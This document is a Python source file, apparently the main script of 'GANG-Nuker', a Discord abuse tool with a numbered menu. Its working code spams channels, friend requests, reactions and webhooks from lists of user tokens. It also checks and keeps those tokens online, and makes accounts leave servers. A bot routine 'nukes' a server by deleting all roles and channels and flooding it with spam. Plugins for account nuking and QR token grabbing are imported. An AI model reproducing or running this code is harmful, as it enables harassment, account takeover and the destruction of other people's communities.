# https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# Coded / Dev / Owner: ††#1792
# Copyright © GANG-Nuker
######################################################### 

from utilities.Settings.common import *
from utilities.Settings.libarys import *
from utilities.Settings.update import search_for_updates

import utilities.Plugins.Account_Nuker
import utilities.Plugins.Auto_Login
import utilities.Plugins.DM_Deleter
import utilities.Plugins.Token_Info
import utilities.Plugins.QR_Grabber

w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
# r = Fore.RESET

#########################################################

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

global useragent
def useragent():
    file = open('data/useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

#########################################################

try:
    with open('data/logins.json') as f:
        config = json.load(f)
except:
    with open('data/logins.json', 'w') as f:
            print(f"\n[{g}#\x1b[95m\x1B[37m] Logging Into GANG-Nuker")
            login = input("[\x1b[95m#\x1b[95m\x1B[37m] Enter A Username: ")
            json.dump({"Login": login}, f, indent=4)
    input(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Successfully Logged in as: [{m}{login}{w}]\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to Continue: ")
    pass
with open('data/logins.json') as f:
    config = json.load(f)
login = config.get('Login')

def x():
    import datetime
    channel7 = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ")
    mess7 = input("[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
    tokens = open("tokens.txt", "r").read().splitlines()
    def spam(token, channel7, mess7):
        url = 'https://discord.com/api/v9/channels/'+channel7+'/messages'
        data = {"content": mess7}
        header = {"authorization": token}
        while True:
            nowxy= datetime.datetime.now()
            r = requests.post(url, data=data, headers=header)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[Successfully Sent From]: {Fore.WHITE}{token[:63]}*********")
            else:
                print(f"{Fore.LIGHTRED_EX}[Failed To Send By]: {Fore.WHITE}{token[:63]}*********")
    for token in tokens:
        while True:
            threads = []
            for token in tokens:
                thread = threading.Thread(target=spam, args=(token,channel7,mess7))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'aud'   : 'English, Austrlia',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

regions = [
    'brazil',
    'hongkong',
    'india',
    'japan',
    'rotterdam',
    'russia',
    'singapore',
    'southafrica',
    'sydney',
    'us-central',
    'us-east',
    'us-south',
    'us-west'
]


def spammer():
    global threads
    setTitle(f"")
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    clear()

    colorama.init()
    Write.Print(f'{login}\n', Colors.blue_to_purple,  interval=0.000)
    print('')
    print('')
    Write.Print("                                      /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                     /$$__  $$ /$$__  $$| $$$ | $$ /$$__  $$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$  \__/| $$  \ $$| $$$$| $$| $$  \__/\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$ /$$$$| $$$$$$$$| $$ $$ $$| $$ /$$$$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$|_  $$| $$__  $$| $$  $$$$| $$|_  $$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print(f' > [v{THIS_VERSION}]                         | $$  \ $$| $$  | $$| $$\  $$$| $$  \ $$\n', Colors.purple_to_blue, interval=0.000)
    Write.Print(f' > [gangnuker.org]                  |  $$$$$$/| $$  | $$| $$ \  $$|  $$$$$$/\n', Colors.purple_to_blue, interval=0.000)
    Write.Print(" > [Github.com/TT-Tutorials]         \______/ |__/  |__/|__/  \__/ \______/ \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_blue, interval=0.000)
    print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
{m}[{w}1{Fore.RESET}{m}]{Fore.RESET} Server Joiner   {b}|{Fore.RESET}{m}[{w}9{Fore.RESET}{m}]{Fore.RESET}  Channel Spammer   {b}|{Fore.RESET}{m}[{w}17{Fore.RESET}{m}]{Fore.RESET} Patch Notes{Fore.RESET}         {b}|{Fore.RESET}{m}[{w}25{Fore.RESET}{m}]{Fore.RESET} Token Generator{Fore.RESET}
{m}[{w}2{Fore.RESET}{m}]{Fore.RESET} Server Leaver   {b}|{Fore.RESET}{m}[{w}10{Fore.RESET}{m}]{Fore.RESET} DM Spammer        {b}|{Fore.RESET}{m}[{w}18{Fore.RESET}{m}]{Fore.RESET} About/Activity{Fore.RESET}      {b}|{Fore.RESET}{m}[{w}26{Fore.RESET}{m}]{Fore.RESET} Nitro Generator{Fore.RESET}
{m}[{w}3{Fore.RESET}{m}]{Fore.RESET} Token Checker   {b}|{Fore.RESET}{m}[{w}11{Fore.RESET}{m}]{Fore.RESET} Friend Spammer    {b}|{Fore.RESET}{m}[{w}19{Fore.RESET}{m}]{Fore.RESET} Server Lookup{Fore.RESET}       {b}|{Fore.RESET}{m}[{w}27{Fore.RESET}{m}]{Fore.RESET} QR Token Grabber{Fore.RESET}
{m}[{w}4{Fore.RESET}{m}]{Fore.RESET} Token Onliner   {b}|{Fore.RESET}{m}[{w}12{Fore.RESET}{m}]{Fore.RESET} HypeSquad Joiner  {b}|{Fore.RESET}{m}[{w}20{Fore.RESET}{m}]{Fore.RESET} Token Infomation{Fore.RESET}    {b}|{Fore.RESET}{m}[{w}28{Fore.RESET}{m}]{Fore.RESET} Member ID Scraper{Fore.RESET}
{m}[{w}5{Fore.RESET}{m}]{Fore.RESET} Token Grabber   {b}|{Fore.RESET}{m}[{w}13{Fore.RESET}{m}]{Fore.RESET} Reaction Spammer  {b}|{Fore.RESET}{m}[{w}21{Fore.RESET}{m}]{Fore.RESET} Status Changer{Fore.RESET}      {b}|{Fore.RESET}{m}[{w}29{Fore.RESET}{m}]{Fore.RESET} PFP Changer{Fore.RESET}
{m}[{w}6{Fore.RESET}{m}]{Fore.RESET} Server MassDM   {b}|{Fore.RESET}{m}[{w}14{Fore.RESET}{m}]{Fore.RESET} NickName Changer  {b}|{Fore.RESET}{m}[{w}22{Fore.RESET}{m}]{Fore.RESET} Group Spammer{Fore.RESET}       {b}|{Fore.RESET}{m}[{w}30{Fore.RESET}{m}]{Fore.RESET} About{Fore.RESET}
{m}[{w}7{Fore.RESET}{m}]{Fore.RESET} Account Nuker   {b}|{Fore.RESET}{m}[{w}15{Fore.RESET}{m}]{Fore.RESET} Webhook Spammer   {b}|{Fore.RESET}{m}[{w}23{Fore.RESET}{m}]{Fore.RESET} Auto Login{Fore.RESET}          {b}|{Fore.RESET}{m}[{w}31{Fore.RESET}{m}]{Fore.RESET}{lr} THREADS{Fore.RESET}
{m}[{w}8{Fore.RESET}{m}]{Fore.RESET} Server Nuker    {b}|{Fore.RESET}{m}[{w}16{Fore.RESET}{m}]{Fore.RESET} VC Spammer        {b}|{Fore.RESET}{m}[{w}24{Fore.RESET}{m}]{Fore.RESET} DM Deleter{Fore.RESET}          {b}|{Fore.RESET}{m}[{w}32{Fore.RESET}{m}]{Fore.RESET}{lr} EXIT{Fore.RESET}''')
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.blue_to_purple, interval=0.000)
    choice = input(f'{m}[{w}>{m}]{w} Choice?: ')



#   JOINER
    if choice == '1':
        Spinner()
        setTitle(f"Server Joiner    |    ")
        gh = input(f"""
Joiner is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!
                                   
[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.org')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   LEAVER
    if choice == '2':
        Spinner()
        setTitle(f"Server Leaver    |    ")
        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')

        apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                }
                requests.delete(apilink, headers=headers)
            print(f'[{g}>{Fore.RESET}] Done')

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   TOKEN CHECKER
    if choice == '3':
            Spinner()
            setTitle(f"Token Checker    |    ") 
            print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Loading Tokens:\n')
            time.sleep(0.5)
            def success(text): lock.acquire(); print(f"[{Fore.GREEN}>{Fore.RESET}] {Fore.GREEN}Valid {Fore.RESET}{text}{Fore.RESET}"); lock.release()
            def invalid(text): lock.acquire(); print(f"[{Fore.RED}>{Fore.RESET}] {Fore.RED}Invalid {Fore.RED} {text}{Fore.RESET}"); lock.release()

            with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
            def save_tokens():
                with open("tokens.txt", "w") as f: f.write("")
                for token in tokens:
                    with open("tokens.txt", "a") as f: f.write(token + "\n")
            def removeDuplicates(file):
                lines_seen = set()
                with open(file, "r+") as f:
                    d = f.readlines(); f.seek(0)
                    for i in d:
                        if i not in lines_seen: f.write(i); lines_seen.add(i)
                    f.truncate()
            def check_token(token:str):
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": token,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
                if response.status_code == 200: success(f"| {token[:63]}*********")
                else: tokens.remove(token); invalid(f"| {token}")
            def check_tokens():
                threads=[]
                for token in tokens:
                    try:threads.append(threading.Thread(target=check_token, args=(token,)))
                    except Exception as e: pass
                for thread in threads: thread.start()
                for thread in threads: thread.join()
            def start():
                removeDuplicates("tokens.txt")
                check_tokens()
                save_tokens()

            start()
            print(f'\n\n[\x1b[95m>\x1b[95m\x1B[37m] All Tokens have been Checked! (tokens.txt has been updated with only vaild tokens!)')
            time.sleep(1)
            exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
            exit = clear()
            exit = spammer()



#   TOKEN ONLINER
    if choice == '4':
            Spinner()
            setTitle(f"Token Onliner    |    ")
            config = {
                "details": "FREE VERSION",
                "state": "https://gangnuker.org",
                "name": "GANG NUKER",
            }

            class Onliner:
                def __init__(self, token) -> None:
                    self.token    = token
                    self.statuses = ["online", "idle", "dnd"]

                def __online__(self):
                    ws = websocket.WebSocket()
                    ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                    response = ws.recv()
                    event = json.loads(response)
                    heartbeat_interval = int(event["d"]["heartbeat_interval"]) / 1000
                    ws.send(
                        json.dumps(
                            {
                                "op": 2,
                                "d": {
                                    "token": self.token,
                                    "properties": {
                                        "$os": sys.platform,
                                        "$browser": "RTB",
                                        "$device": f"{sys.platform} Device",
                                    },
                                    "presence": {
                                        "game": {
                                            "name": config["name"],
                                            "type": 0,
                                            "details": config["details"],
                                            "state": config["state"],
                                        },
                                        "status": random.choice(self.statuses),
                                        "since": 0,
                                        "activities": [],
                                        "afk": False,
                                    },
                                },
                                "s": None,
                            "t": None,
                            }
                        )
                    )

                    print(f"\n[{g}+{w}] Online | {self.token}")

                    while True:
                        heartbeatJSON = {
                            "op": 1, 
                            "token": self.token, 
                            "d": "null"
                        }
                        ws.send(json.dumps(heartbeatJSON))
                        time.sleep(heartbeat_interval)


            for token in open("./tokens.txt", "r").read().splitlines():
                threading.Thread(target=Onliner(token).__online__).start()
            time.sleep(2)
            exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
            exit = clear()
            exit = spammer()



#   TOKEN GRABBER
    if choice == '5':
        Spinner()
        setTitle(f"Token Grabber    |    ")
        print(f"\n[{lr}!{w}] Token Grabber is Currently Down... Updating Soon!")

        time.sleep(2.5)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        clear()
        exit = spammer()




#   SERVER MASSDM
    if choice == '6':
        Spinner()
        setTitle(f"Server MassDM    |    ")
        print(f"\n[{lr}!{w}] Server MassDM is Currently Down... Updating Soon!")

        time.sleep(2.5)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        clear()
        exit = spammer()



#   ACCOUNT NUKER
    if choice == '7':
        Spinner()
        setTitle(f"Account Nuker    |    ")
        token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
        validateToken(token)
        Server_Name = str(input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server Name?: '))
        message_Content = str(input(f'[\x1b[95m>\x1b[95m\x1B[37m] MassDM Message?: '))
        if threading.active_count() < threads:
            threading.Thread(target=utilities.Plugins.Account_Nuker.GANGNUKER_START, args=(token, Server_Name, message_Content)).start()



#   SERVER NUKER
    if choice == '8':
        Spinner()
        setTitle(f"Server Nuker   |    ")
#       intents = discord.Client(intents=discord.Intents().all())
#       width = os.get_terminal_size().columns
        def menu():
                token = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Bot token : ")
                f = open("utilities/Plugins/ignore/.token", "w")
                f.write(token)
                f.close()

                prefix = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot prefix : ")
                f = open("utilities/Plugins/ignore/.prefix", "w")
                f.write(prefix)
                f.close()

                spammessage = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : ")
                f = open("utilities/Plugins/ignore/.message", "w")
                f.write(spammessage)
                f.close()

                channelsname = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : ")
                f = open("utilities/Plugins/ignore/.channelsname", "w")
                channelsname = channelsname.lower()
                channelsname.replace("", "-")
                f.write(channelsname)
                f.close()
                main()

        def main():
    
            prefix = open("utilities/Plugins/ignore/.prefix", "r")
            prefix = prefix.read()

            token = open("utilities/Plugins/ignore/.token", "r")
            token = token.read()

            channelsname = open("utilities/Plugins/ignore/.channelsname", "r")
            channelsname = channelsname.read()

            spammessage = open("utilities/Plugins/ignore/.message", "r")
            spammessage = spammessage.read()

            gang = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            gang.remove_command('help')

            @gang.event
            async def on_ready():
                if len(gang.guilds) > 1:
                    guildpl = "guilds"
                else:
                    guildpl = "guild"
                activity = discord.Game(name=f"GANG-Nuker Server Nuker", type=3)
                await gang.change_presence(status=discord.Status.dnd, activity=activity)
                clear()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot : {gang.user} ({len(gang.guilds)} {guildpl})")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Prefix : {prefix}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : {spammessage}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : {channelsname}")
                print(f"")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] type: {prefix}nuke in a channel")
                print(f"")

            @gang.event
            async def on_guild_channel_create(channel):
                while True:
                    await channel.send(spammessage)
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent : {spammessage}")

            @gang.event
            async def on_guild_join(guild):
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite()
                        break
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Joined Guild : {guild.name} ({guild.id}) {invite}")

            @gang.command()
            async def nuke(ctx):
                await ctx.message.delete()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Nuking {ctx.guild.name} ({ctx.guild.id})...")
                await ctx.guild.edit(name="GANG-Nuker Runs Discord")
                for role in ctx.guild.roles:
                    try:
                        await role.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: @{role.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: @{role.name}")

                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: #{channel.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: #{channel.name}")
                try:
                    for i in range(50):
                        await ctx.guild.create_text_channel(channelsname)
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created: #{channel.name}")
                except Exception as er:
                    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error: {er}")
            try:
                gang.run(token)
            except Exception as er:
                pass
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                input()

        while True:
            menu()



#   CHANNEL SPAMMER
    if choice == '9':
        Spinner()
        setTitle(f"Channel Spammer    |    ")
        x()



#   DM SPAMMER
    if choice == '10':
        Spinner()
        setTitle(f"DM Spammer    |    ")
        gh = input(f"""
DM Spammer is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!

[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.org')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   FRIEND REQ SPAMMER
    if choice == '11':
        Spinner()
        setTitle(f"Friend Request Spammer    |    ")
        def friender(token, user):
            try:
                user = user.split("#")
                headers = mainHeader(token)
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Friend Request Sent to {user[0]}#{user[1]}! ")
            except Exception as e:
                print(e)

        user = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()

        time.sleep(2)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   HYPESQUAD JOINER
    if choice == '12':
        Spinner()
        setTitle(f"HypeSquad Joiner    |    ")
        print(f'''\n[\x1b[95m1\x1b[95m\x1B[37m] {Fore.MAGENTA}Bravery{Fore.RESET}
[\x1b[95m2\x1b[95m\x1B[37m] {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
[\x1b[95m3\x1b[95m\x1B[37m] {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
[\x1b[95m4\x1b[95m\x1B[37m] Leave The HypeSquad''')

        house = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")

        def hype(token):
            headers = mainHeader(token)

            if house == "1":
                housefinal = '1'

            if house == "2":
                housefinal = '2'

            if house == "3":
                housefinal = '3'

            if house == '4':
                housefinal = None

            if house == '1' or '2' or '3':
                payload = {
                    'house_id': housefinal
                }
                rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                if rep.status_code == 204:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                else:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed')

            if house == '4':
                payload = {
                    'house_id': housefinal
                }
                req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                if req.status_code == 204:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                else:
                    pass

            else:
                pass

        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=hype(token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   REACTION SPAMMER
    if choice == '13':
        Spinner()
        setTitle(f"Reaction Spammer    |    ")
        def reaction(chd, iddd, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       "sec-fetch-dest": "empty",
                       "sec-fetch-mode": "cors",
                       "sec-fetch-site": "same-origin",
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            emoji = ej.emojize(org, use_aliases=True)
            a = requests.put(
                f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                headers=headers)
            if a.status_code == 204:
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Reaction {org}")
            else:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Channel ID?: ')
        iddd = input('[\x1b[95m>\x1b[95m\x1B[37m] Message ID?: ')
        emoji = input('[\x1b[95m>\x1b[95m\x1B[37m] Emoji?: ')
        delay = int(input('[\x1b[95m>\x1b[95m\x1B[37m] Delay?: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   NICKNAME CHANGER
    if choice == '14':
        Spinner()
        setTitle(f"Nickname Changer    |    ")
        def changenick(server, nickname, token):
            headers = mainHeader(token)

            r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                               json={"nick": nickname})
            if r.status_code == 200:
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Nickname Changed ')
            if r.status_code != 200:
                print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Cant Change Nickname... {Fore.RESET}')

        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ")
        nick = input("[\x1b[95m>\x1b[95m\x1B[37m] Nickname?: ")
        for token in tokens:
            threading.Thread(target=changenick, args=(server, nick, token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   WEBHOOK SPAMMER
    if choice == '15':
        Spinner()
        setTitle(f"Webhook Spammer    |    ")
        session = requests.Session()
        webhook = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL: ")
        message = input("[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
        username = input("[\x1b[95m>\x1b[95m\x1B[37m] Webhook Username?: ")

        def gang():
            session.post(webhook,json = {"content":message,"username":username})
    
            while True:
                for i in range(15):
                    threading.Thread(target=gang).start()
        gang()



#   VC SPAMMER
    if choice == '16':
        Spinner()
        setTitle(f"Voice Call Spammer    |    ")
#       tokenfaster = open(easygui.range.faster(), 'r').run().splitlines()
        tokenlist = open("tokens.txt", "r").read().splitlines()
